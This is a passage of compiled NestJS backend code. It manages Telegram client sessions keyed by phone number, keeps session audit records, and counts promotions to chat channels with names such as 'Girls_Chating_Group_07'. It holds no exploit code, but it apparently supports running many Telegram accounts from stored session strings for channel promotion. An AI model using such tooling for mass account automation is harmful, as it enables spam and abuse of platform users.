    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatSchema = exports.PromoteStat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let PromoteStat = class PromoteStat {
};
exports.PromoteStat = PromoteStat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteStat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    (0, mongoose_1.Prop)({ required: true, type: Map, of: Number }),
    __metadata("design:type", Map)
], PromoteStat.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], PromoteStat.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Last Updated TimeStamp' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    (0, mongoose_1.Prop)({ required: true, type: [String] }),
    __metadata("design:type", Array)
], PromoteStat.prototype, "channels", void 0);
exports.PromoteStat = PromoteStat = __decorate([
    (0, mongoose_1.Schema)()
], PromoteStat);
exports.PromoteStatSchema = mongoose_1.SchemaFactory.createForClass(PromoteStat);


/***/ }),

/***/ "./src/components/session-manager/client-registry.ts":
/*!***********************************************************!*\
  !*** ./src/components/session-manager/client-registry.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var ClientRegistry_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientRegistry = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const telegram_logger_1 = __webpack_require__(/*! ../Telegram/utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
let ClientRegistry = ClientRegistry_1 = class ClientRegistry {
    constructor() {
        this.clients = new Map();
        this.logger = new telegram_logger_1.TelegramLogger('clientRegistry');
        this.locks = new Map();
        this.LOCK_TIMEOUT = 30000;
        this.LOCK_EXPIRY = 120000;
        this.CLIENT_TIMEOUT = 300000;
        setInterval(() => this.cleanupInactiveClients(), 60000);
        setInterval(() => this.cleanupExpiredLocks(), 30000);
    }
    static getInstance() {
        if (!ClientRegistry_1.instance) {
            ClientRegistry_1.instance = new ClientRegistry_1();
        }
        return ClientRegistry_1.instance;
    }
    async acquireLock(mobile) {
        const lockId = `${mobile}_${Date.now()}_${Math.random()}`;
        const now = new Date();
        const existingLock = this.locks.get(mobile);
        if (existingLock) {
            if (now.getTime() - existingLock.acquired.getTime() > this.LOCK_EXPIRY) {
                this.locks.delete(mobile);
                this.logger.info(mobile, 'Removed expired lock');
            }
            else {
                this.logger.info(mobile, 'Lock already exists, waiting...');
                return null;
            }
        }
        this.locks.set(mobile, { acquired: now, lockId });
        this.logger.info(mobile, `Lock acquired: ${lockId}`);
        return lockId;
    }
    releaseLock(mobile, lockId) {
        const lock = this.locks.get(mobile);
        if (lock && lock.lockId === lockId) {
            this.locks.delete(mobile);
            this.logger.info(mobile, `Lock released: ${lockId}`);
            return true;
        }
        return false;
    }
    async waitForLock(mobile) {
        const startTime = Date.now();
        while (Date.now() - startTime < this.LOCK_TIMEOUT) {
            const lockId = await this.acquireLock(mobile);
            if (lockId) {
                return lockId;
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        throw new Error(`Lock acquisition timeout for ${mobile}`);
    }
    hasClient(mobile) {
        return this.clients.has(mobile);
    }
    getClientInfo(mobile) {
        return this.clients.get(mobile) || null;
    }
    async registerClient(mobile, client, sessionString, lockId) {
        const lock = this.locks.get(mobile);
        if (!lock || lock.lockId !== lockId) {
            throw new Error(`Invalid lock for registering client: ${mobile}`);
        }
        if (this.clients.has(mobile)) {
            this.logger.error(mobile, 'Client already exists, cannot register new one', new Error('Duplicate client'));
            return false;
        }
        const clientInfo = {
            client,
            mobile,
            sessionString,
            createdAt: new Date(),
            lastActivity: new Date(),
            isCreating: false,
            lockId
        };
        this.clients.set(mobile, clientInfo);
        this.logger.info(mobile, 'Client registered successfully');
        return true;
    }
    markClientCreating(mobile, lockId) {
        const lock = this.locks.get(mobile);
        if (!lock || lock.lockId !== lockId) {
            return false;
        }
        const existing = this.clients.get(mobile);
        if (existing) {
            existing.isCreating = true;
            existing.lastActivity = new Date();
            return true;
        }
        const clientInfo = {
            client: null,
            mobile,
            sessionString: '',
            createdAt: new Date(),
            lastActivity: new Date(),
            isCreating: true,
            lockId
        };
        this.clients.set(mobile, clientInfo);
        return true;
    }
    updateActivity(mobile) {
        const clientInfo = this.clients.get(mobile);
        if (clientInfo) {
            clientInfo.lastActivity = new Date();
        }
    }
    async removeClient(mobile, lockId) {
        const clientInfo = this.clients.get(mobile);
        if (!clientInfo) {
            return false;
        }
        if (lockId) {
            const lock = this.locks.get(mobile);
            if (!lock || lock.lockId !== lockId) {
                this.logger.error(mobile, 'Invalid lock for removing client', new Error('Invalid lock'));
                return false;
            }
        }
        if (clientInfo.client) {
            try {
                let tempClient = clientInfo.client;
                if (tempClient) {
                    try {
                        await tempClient.destroy();
                        tempClient._eventBuilders = [];
                        this.logger.info(mobile, 'Temporary client cleaned up');
                    }
                    catch (cleanupError) {
                        this.logger.error(mobile, 'Failed to cleanup temporary client', cleanupError);
                    }
                    finally {
                        if (tempClient) {
                            tempClient._destroyed = true;
                            if (tempClient._sender && typeof tempClient._sender.disconnect === 'function') {
                                await tempClient._sender.disconnect();
                            }
                            tempClient = null;
                        }
                    }
                }
                this.logger.info(mobile, 'Client disconnected during removal');
            }
            catch (error) {
                this.logger.error(mobile, 'Error disconnecting client during removal', error);
            }
        }
        this.clients.delete(mobile);
        this.logger.info(mobile, 'Client removed from registry');
        return true;
    }
    getActiveClientCount() {
        return this.clients.size;
    }
    getActivemobiles() {
        return Array.from(this.clients.keys());
    }
    async cleanupInactiveClients() {
        const now = new Date();
        const inactiveClients = [];
        for (const [mobile, clientInfo] of this.clients.entries()) {
            const inactiveTime = now.getTime() - clientInfo.lastActivity.getTime();
            if (inactiveTime > this.CLIENT_TIMEOUT) {
                inactiveClients.push(mobile);
            }
        }
        for (const mobile of inactiveClients) {
            this.logger.info(mobile, 'Removing inactive client');
            await this.removeClient(mobile);
        }
        if (inactiveClients.length > 0) {
            this.logger.info('SYSTEM', `Cleaned up ${inactiveClients.length} inactive clients`);
        }
    }
    cleanupExpiredLocks() {
        const now = new Date();
        const expiredLocks = [];
        for (const [mobile, lock] of this.locks.entries()) {
            const lockAge = now.getTime() - lock.acquired.getTime();
            if (lockAge > this.LOCK_EXPIRY) {
                expiredLocks.push(mobile);
            }
        }
        for (const mobile of expiredLocks) {
            this.locks.delete(mobile);
            this.logger.info(mobile, 'Removed expired lock');
        }
        if (expiredLocks.length > 0) {
            this.logger.info('SYSTEM', `Cleaned up ${expiredLocks.length} expired locks`);
        }
    }
    async forceCleanup(mobile) {
        let cleanedCount = 0;
        if (this.locks.has(mobile)) {
            this.locks.delete(mobile);
            cleanedCount++;
        }
        if (await this.removeClient(mobile)) {
            cleanedCount++;
        }
        this.logger.info(mobile, `Force cleanup completed, removed ${cleanedCount} items`);
        return cleanedCount;
    }
    getStats() {
        return {
            activeClients: this.clients.size,
            activeLocks: this.locks.size,
            mobiles: Array.from(this.clients.keys())
        };
    }
};
exports.ClientRegistry = ClientRegistry;
ClientRegistry.instance = null;
exports.ClientRegistry = ClientRegistry = ClientRegistry_1 = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [])
], ClientRegistry);


/***/ }),

/***/ "./src/components/session-manager/index.ts":
/*!*************************************************!*\
  !*** ./src/components/session-manager/index.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./session.service */ "./src/components/session-manager/session.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./session.controller */ "./src/components/session-manager/session.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./session.module */ "./src/components/session-manager/session.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./client-registry */ "./src/components/session-manager/client-registry.ts"), exports);
__exportStar(__webpack_require__(/*! ./session-audit.service */ "./src/components/session-manager/session-audit.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts"), exports);


/***/ }),

/***/ "./src/components/session-manager/schemas/sessions.schema.ts":
/*!*******************************************************************!*\
  !*** ./src/components/session-manager/schemas/sessions.schema.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionAuditSchema = exports.SessionAudit = exports.SessionCreationMethod = exports.SessionStatus = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
var SessionStatus;
(function (SessionStatus) {
    SessionStatus["CREATED"] = "created";
    SessionStatus["ACTIVE"] = "active";
    SessionStatus["EXPIRED"] = "expired";
    SessionStatus["REVOKED"] = "revoked";
    SessionStatus["FAILED"] = "failed";
})(SessionStatus || (exports.SessionStatus = SessionStatus = {}));
var SessionCreationMethod;
(function (SessionCreationMethod) {
    SessionCreationMethod["OLD_SESSION"] = "old_session";
    SessionCreationMethod["USER_MOBILE"] = "user_mobile";
    SessionCreationMethod["INPUT_SESSION"] = "input_session";
})(SessionCreationMethod || (exports.SessionCreationMethod = SessionCreationMethod = {}));
let SessionAudit = class SessionAudit {
};
exports.SessionAudit = SessionAudit;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '916265240911', description: 'Phone number associated with the session' }),
    (0, mongoose_1.Prop)({ required: true, index: true }),
    __metadata("design:type", String)
], SessionAudit.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==...', description: 'Encrypted session string' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "sessionString", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'active', description: 'Current status of the session', enum: SessionStatus }),
    (0, mongoose_1.Prop)({ required: true, enum: SessionStatus, default: SessionStatus.CREATED }),
    __metadata("design:type", String)
], SessionAudit.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'old_session', description: 'Method used to create the session', enum: SessionCreationMethod }),
    (0, mongoose_1.Prop)({ required: true, enum: SessionCreationMethod }),
    __metadata("design:type", String)
], SessionAudit.prototype, "creationMethod", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Session created successfully', description: 'Creation success/failure message' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "creationMessage", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '1BQANOTEuM==...', description: 'Previous session string used for creation (if applicable)' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "previousSessionString", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T10:00:00Z', description: 'When the session was created' }),
    (0, mongoose_1.Prop)({ default: Date.now }),
    __metadata("design:type", Date)
], SessionAudit.prototype, "createdAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T15:30:00Z', description: 'Last time the session was used' }),
    (0, mongoose_1.Prop)({ default: Date.now }),
    __metadata("design:type", Date)
], SessionAudit.prototype, "lastUsedAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2024-01-01T10:00:00Z', description: 'When the session expires' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Date)
], SessionAudit.prototype, "expiresAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID associated with this session' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'ShruthiRedd2', description: 'Username associated with this session' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 3, description: 'Number of retry attempts during creation' }),
    (0, mongoose_1.Prop)({ default: 0 }),
    __metadata("design:type", Number)
], SessionAudit.prototype, "retryAttempts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Rate limit exceeded', description: 'Error message if creation failed' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "errorMessage", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        example: { userAgent: 'Telegram-Desktop/1.0', ipAddress: '192.168.1.1' },
        description: 'Additional metadata about session creation'
    }),
    (0, mongoose_1.Prop)({ type: Object }),
    __metadata("design:type", Object)
], SessionAudit.prototype, "metadata", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Whether this session is currently active' }),
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], SessionAudit.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T16:00:00Z', description: 'When the session was revoked/expired' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Date)
], SessionAudit.prototype, "revokedAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'manual_revocation', description: 'Reason for session revocation' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "revocationReason", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 5, description: 'Number of times this session has been used' }),
    (0, mongoose_1.Prop)({ default: 0 }),
    __metadata("design:type", Number)
], SessionAudit.prototype, "usageCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'session_validation_failed', description: 'Last known error with this session' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], SessionAudit.prototype, "lastError", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '2023-12-01T15:45:00Z', description: 'When the last error occurred' }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Date)
], SessionAudit.prototype, "lastErrorAt", void 0);
exports.SessionAudit = SessionAudit = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'session_audits',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
                delete ret.__v;
            },
        },
    })
], SessionAudit);
exports.SessionAuditSchema = mongoose_1.SchemaFactory.createForClass(SessionAudit);
exports.SessionAuditSchema.index({ mobile: 1, createdAt: -1 });
exports.SessionAuditSchema.index({ status: 1, isActive: 1 });
exports.SessionAuditSchema.index({ createdAt: -1 });
exports.SessionAuditSchema.index({ lastUsedAt: -1 });
exports.SessionAuditSchema.index({ mobile: 1, isActive: 1, status: 1 });
exports.SessionAuditSchema.pre('findOneAndUpdate', function () {
    const update = this.getUpdate();
    if (update.$set && !update.$set.lastUsedAt) {
        update.$set.lastUsedAt = new Date();
    }
});


/***/ }),

/***/ "./src/components/session-manager/session-audit.service.ts":
/*!*****************************************************************!*\
  !*** ./src/components/session-manager/session-audit.service.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SessionAuditService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const sessions_schema_1 = __webpack_require__(/*! ./schemas/sessions.schema */ "./src/components/session-manager/schemas/sessions.schema.ts");
const telegram_logger_1 = __webpack_require__(/*! ../Telegram/utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
let SessionAuditService = class SessionAuditService {
    constructor(sessionAuditModel) {
        this.sessionAuditModel = sessionAuditModel;
        this.logger = new telegram_logger_1.TelegramLogger('SessionAuditService');
    }
    async createAuditRecord(createDto) {
        try {
            this.logger.info(createDto.mobile, 'Creating session audit record');
            const sessionAudit = new this.sessionAuditModel({
                ...createDto,
                status: sessions_schema_1.SessionStatus.CREATED,
                createdAt: new Date(),
                lastUsedAt: new Date(),
                usageCount: 0,
                isActive: true
            });
            const savedRecord = await sessionAudit.save();
            this.logger.info(createDto.mobile, `Session audit record created with ID: ${savedRecord.id}`);
            return savedRecord;
        }
        catch (error) {
            this.logger.error(createDto.mobile, 'Failed to create session audit record', error);
            throw error;
        }
    }
    async updateAuditRecord(mobile, sessionString, updateDto) {
        try {
            this.logger.info(mobile, 'Updating session audit record');
            const updateData = {
                ...updateDto,
                lastUsedAt: new Date()
            };
            const query = { mobile, isActive: true };
            if (sessionString) {
                query.sessionString = sessionString;
            }
            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(query, { $set: updateData }, { new: true, sort: { createdAt: -1 } });
            if (updatedRecord) {
                this.logger.info(mobile, `Session audit record updated: ${updatedRecord.id}`);
            }
            else {
                this.logger.info(mobile, 'No active session audit record found to update');
            }
            return updatedRecord;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to update session audit record', error);
            throw error;
        }
    }
    async markSessionUsed(mobile, sessionString) {
        try {
            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {
                this.logger.warn('system', 'Invalid mobile number provided to markSessionUsed');
                return null;
            }
            const query = { mobile, isActive: true };
            if (sessionString && typeof sessionString === 'string' && sessionString.trim().length > 0) {
                query.sessionString = sessionString;
            }
            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(query, {
                $inc: { usageCount: 1 },
                $set: { lastUsedAt: new Date() }
            }, { new: true, sort: { createdAt: -1 } });
            if (updatedRecord) {
                this.logger.info(mobile, `Session usage recorded: count ${updatedRecord.usageCount}`);
            }
            else {
                this.logger.warn(mobile, 'No active session found to mark as used');
            }
            return updatedRecord;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to mark session as used', error);
            throw error;
        }
    }
    async markSessionFailed(mobile, sessionString, errorMessage) {
        try {
            return await this.updateAuditRecord(mobile, sessionString, {
                status: sessions_schema_1.SessionStatus.FAILED,
                errorMessage,
                lastError: errorMessage,
                isActive: false
            });
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to mark session as failed', error);
            throw error;
        }
    }
    async revokeSession(mobile, sessionString, reason = 'manual_revocation') {
        try {
            return await this.updateAuditRecord(mobile, sessionString, {
                status: sessions_schema_1.SessionStatus.REVOKED,
                revocationReason: reason,
                revokedAt: new Date(),
                isActive: false
            });
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to revoke session', error);
            throw error;
        }
    }
    async getSessionsFormobile(mobile, activeOnly = false) {
        try {
            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {
                this.logger.warn('system', 'Invalid mobile number provided to getSessionsFormobile');
                return [];
            }
            const query = { mobile };
            if (activeOnly) {
                query.isActive = true;
                query.status = { $in: [sessions_schema_1.SessionStatus.ACTIVE, sessions_schema_1.SessionStatus.CREATED] };
            }
            const sessions = await this.sessionAuditModel
                .find(query)
                .sort({ createdAt: -1 })
                .limit(100)
                .exec();
            this.logger.info(mobile, `Retrieved ${sessions.length} session records (activeOnly: ${activeOnly})`);
            return sessions;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to get sessions for phone number', error);
            throw error;
        }
    }
    async getLatestActiveSession(mobile) {
        try {
            const session = await this.sessionAuditModel
                .findOne({ mobile, isActive: true })
                .sort({ createdAt: -1 })
                .exec();
            if (session) {
                this.logger.info(mobile, `Latest active session found: ${session.id}`);
            }
            return session;
        }
        catch (error) {
            this.logger.error(mobile, 'Failed to get latest active session', error);
            throw error;
        }
    }
    async querySessionAudits(queryDto) {
        try {
            const { mobile, status, creationMethod, isActive, limit = 20, offset = 0, startDate, endDate } = queryDto;
            const query = {};
            if (mobile)
                query.mobile = mobile;
            if (status)
                query.status = status;
            if (creationMethod)
                query.creationMethod = creationMethod;
            if (isActive !== undefined)
                query.isActive = isActive;
            if (startDate || endDate) {
                query.createdAt = {};
                if (startDate)
                    query.createdAt.$gte = startDate;
                if (endDate)
                    query.createdAt.$lte = endDate;
            }
            const [sessions, total] = await Promise.all([
                this.sessionAuditModel
                    .find(query)
                    .sort({ createdAt: -1 })
                    .skip(offset)
                    .limit(limit)
                    .exec(),
                this.sessionAuditModel.countDocuments(query)
            ]);
            this.logger.info('system', `Session audit query returned ${sessions.length} of ${total} records`);
            return {
                sessions,
                total,
                page: Math.floor(offset / limit) + 1,
                limit
            };
        }
        catch (error) {
            this.logger.error('system', 'Failed to query session audits', error);
            throw error;
        }
    }
    async getSessionStats(mobile, days = 30) {
        try {
            const startDate = new Date();
            startDate.setDate(startDate.getDate() - days);
            const query = { createdAt: { $gte: startDate } };
            if (mobile) {
                query.mobile = mobile;
            }
            const stats = await this.sessionAuditModel.aggregate([
                { $match: query },
                {
                    $group: {
                        _id: null,
                        totalSessions: { $sum: 1 },
                        activeSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.ACTIVE] }, 1, 0] }
                        },
                        expiredSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.EXPIRED] }, 1, 0] }
                        },
                        revokedSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.REVOKED] }, 1, 0] }
                        },
                        failedSessions: {
                            $sum: { $cond: [{ $eq: ['$status', sessions_schema_1.SessionStatus.FAILED] }, 1, 0] }
                        }
                    }
                }
            ]);
            const methodBreakdown = await this.sessionAuditModel.aggregate([
                { $match: query },
                {
                    $group: {
                        _id: '$creationMethod',
                        count: { $sum: 1 }
                    }
                }
            ]);
            const baseStats = stats[0] || {
                totalSessions: 0,
                activeSessions: 0,
                expiredSessions: 0,
                revokedSessions: 0,
                failedSessions: 0
            };
            const creationMethodBreakdown = {};
            methodBreakdown.forEach(item => {
                creationMethodBreakdown[item._id] = item.count;
            });
            const result = {
                ...baseStats,
                creationMethodBreakdown,
                dateRange: {
                    start: startDate,
                    end: new Date()
                }
            };
            this.logger.info(mobile || 'system', `Session stats retrieved: ${result.totalSessions} total sessions`);
            return result;
        }
        catch (error) {
            this.logger.error(mobile || 'system', 'Failed to get session stats', error);
            throw error;
        }
    }
    async cleanupOldSessions(days = 90) {
        try {
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - days);
            const result = await this.sessionAuditModel.deleteMany({
                createdAt: { $lt: cutoffDate },
                isActive: false
            });
            this.logger.info('system', `Cleaned up ${result.deletedCount} old session records`);
            return { deletedCount: result.deletedCount };
        }
        catch (error) {
            this.logger.error('system', 'Failed to cleanup old sessions', error);
            throw error;
        }
    }
    async findRecentSessions(mobile, days = 30) {
        try {
            if (!mobile || typeof mobile !== 'string' || mobile.trim().length === 0) {
                this.logger.warn('system', 'Invalid mobile number provided to findRecentSessions');
                return [];
            }
            if (days <= 0 || days > 365) {
                this.logger.warn(mobile, `Invalid days parameter: ${days}, using default 10 days`);
                days = 30;
            }
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - days);
            cutoffDate.setHours(0, 0, 0, 0);
            const recentSessions = await this.sessionAuditModel
                .find({
                mobile,
                isActive: true,
                status: { $in: [sessions_schema_1.SessionStatus.ACTIVE, sessions_schema_1.SessionStatus.CREATED] },
                $or: [
                    { lastUsedAt: { $gte: cutoffDate } },
                    {
                        lastUsedAt: { $exists: false },
                        createdAt: { $gte: cutoffDate }
                    }
                ]
            })
                .sort({ lastUsedAt: -1, createdAt: -1 })
                .limit(50)
                .exec();
            this.logger.info(mobile, `Found ${recentSessions.length} recent sessions from last ${days} days`);
            return recentSessions;
        }
        catch (error) {
            this.logger.error(mobile, `Failed to find valid session from last ${days} days`, error);
            throw error;
        }
    }
    async markExpiredSessions(inactiveDays = 7) {
        try {
            const cutoffDate = new Date();
            cutoffDate.setDate(cutoffDate.getDate() - inactiveDays);
            const result = await this.sessionAuditModel.updateMany({
                lastUsedAt: { $lt: cutoffDate },
                status: { $in: [sessions_schema_1.SessionStatus.CREATED, sessions_schema_1.SessionStatus.ACTIVE] },
                isActive: true
            }, {
                $set: {
                    status: sessions_schema_1.SessionStatus.EXPIRED,
                    isActive: false,
                    revokedAt: new Date(),
                    revocationReason: 'auto_expired_due_to_inactivity'
                }
            });
            this.logger.info('system', `Marked ${result.modifiedCount} sessions as expired`);
            return { modifiedCount: result.modifiedCount };
        }
        catch (error) {
            this.logger.error('system', 'Failed to mark expired sessions', error);
            throw error;
        }
    }
};
exports.SessionAuditService = SessionAuditService;
exports.SessionAuditService = SessionAuditService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(sessions_schema_1.SessionAudit.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], SessionAuditService);


/***/ }),

/***/ "./src/components/session-manager/session.controller.ts":
/*!**************************************************************!*\
  !*** ./src/components/session-manager/session.controller.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
